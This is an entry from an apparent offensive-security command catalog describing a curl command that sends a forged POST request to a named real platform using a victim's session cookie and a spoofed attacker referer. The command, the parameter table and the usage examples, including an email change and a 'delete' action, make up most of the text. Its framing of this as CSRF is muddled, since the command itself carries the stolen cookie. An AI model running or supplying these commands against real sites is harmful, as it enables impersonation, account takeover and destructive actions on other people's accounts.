---
id: cmd-curl-csrf-forged
data: >-
  curl -X POST 'https://hackerone.com/vulnerable-endpoint' -H 'Cookie:
  session=authenticated_session_token' -d 'action=unauthorized&param=value'
  --referer 'http://attacker-site.com/malicious.html'
name: curl-csrf-forged-request
tags:
  - csrf
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:42.393Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-forged-request

## Command

```bash
curl -X POST 'https://hackerone.com/vulnerable-endpoint' \
  -H 'Cookie: session=authenticated_session_token' \
  -d 'action=unauthorized&param=value' \
  --referer 'http://attacker-site.com/malicious.html'
```

## Description

This command uses curl to simulate a forged CSRF request to a vulnerable endpoint on the HackerOne platform, sending a POST with session cookies to perform an unauthorized action. It mimics a cross-site submission by setting a fake referer.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST for state-changing requests | Yes |
| `'https://hackerone.com/vulnerable-endpoint'` | Target URL of the vulnerable endpoint | Yes |
| `-H 'Cookie: session=authenticated_session_token'` | Injects the victim's session cookie to impersonate them | Yes |
| `-d 'action=unauthorized&param=value'` | Form data payload for the unauthorized action | Yes |
| `--referer 'http://attacker-site.com/malicious.html'` | Fakes the referer to simulate a cross-site request | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/profile/update' -H 'Cookie: session=abc123' -d 'email=new@email.com'
```

### Advanced Usage

```bash
curl -X POST 'https://hackerone.com/vulnerable-endpoint' \
  -H 'Cookie: session=authenticated_session_token' \
  -H 'User-Agent: Mozilla/5.0' \
  -d 'action=delete&confirm=yes' \
  --referer 'http://evil.com' \
  -v
```

## Expected Output

Successful execution returns an HTTP 200 OK or 302 redirect, with response body indicating the action completed (e.g., "Profile updated successfully"). Errors may include 403 if protections are in place.

## Related

- [[Related Procedure|procedures/Exploiting-CSRF-in-HackerOne-Platform]]
